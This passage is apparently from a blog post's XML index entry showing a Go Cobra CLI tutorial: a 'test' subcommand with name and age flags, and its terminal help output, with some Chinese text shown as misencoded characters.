compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; ÊúÄÂêéÊµãËØï‰∏ãÊòØ‰∏çÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊïàÊûú 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 ÂëΩ‰ª§Ë°åË°•ÂÖ®ÔºåmanËøô‰∫õÂèØ‰ª•Ëá™Â∑±ÊâãÂä®ÊµãËØï]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cobra</tag>
      </tags>
  </entry>
</search>
